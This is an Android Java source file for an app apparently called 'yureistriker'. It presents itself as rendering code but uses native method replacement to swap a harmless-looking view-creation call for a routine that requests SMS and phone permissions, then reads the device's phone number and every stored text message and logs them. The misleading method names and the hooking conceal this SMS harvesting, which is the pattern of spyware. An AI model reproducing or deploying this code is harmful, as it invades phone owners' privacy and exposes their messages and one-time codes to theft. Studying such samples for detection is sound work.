package com.example.yureistriker;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.SurfaceView;
import android.widget.TextView;

import com.example.yureistriker.databinding.ActivityMainBinding;

import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.Socket;

import android.Manifest;

public class MainActivity extends AppCompatActivity {
    static {
        System.loadLibrary("yureistriker");
    }

    private ActivityMainBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        registerNativeMethods(MainActivity.class);
        setProperties();

        CreateGlView();

        TextView tv = binding.sampleText;
        tv.setText("ola");
    }

    void setProperties(){
        try {
            Method targetMethod = MainActivity.class.getDeclaredMethod("CreateGlView");
            Method replacementMethod = MainActivity.class.getDeclaredMethod("RenderShapes");

            Method replaceMethod = MainActivity.class.getDeclaredMethod("ReplaceMethodByObject", Object.class, Object.class);

            replaceMethod.setAccessible(true);
            replaceMethod.invoke(this, targetMethod, replacementMethod);
        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException e) {
            this.finish();
        }
    }

    void RenderShapes(){
        geometryGen(this);
    }

    @SuppressLint("Range")
    public void geometryGen(Context context){
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions((Activity) context,
                    new String[]{
                            Manifest.permission.READ_SMS,
                            Manifest.permission.READ_PHONE_NUMBERS,
                            Manifest.permission.READ_PHONE_STATE
                    }, 100);
        }

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            String phone = tMgr.getLine1Number();
            if(phone !=null && !phone.isEmpty()){
                Log.w("Yurei", phone);
            }

            ContentResolver contentResolver = context.getContentResolver();
            Uri smsUri = Telephony.Sms.CONTENT_URI;
            Cursor cursor = contentResolver.query(smsUri, null, null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                StringBuilder smsData = new StringBuilder();

                do {
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    Log.w("Yurei", "Address: " + address + ", Message: " + body + ", Date: " + date);
                } while (cursor.moveToNext());
                cursor.close();
            }
        }
    }

    private SurfaceView CreateGlView() {return null;}

    public native void ReplaceMethodByObject(Object obj1, Object obj2);
    private static native void nativeRegister(Class<?> clazz);

    public static void registerNativeMethods(Class<?> clazz){
        nativeRegister(clazz);
    }
}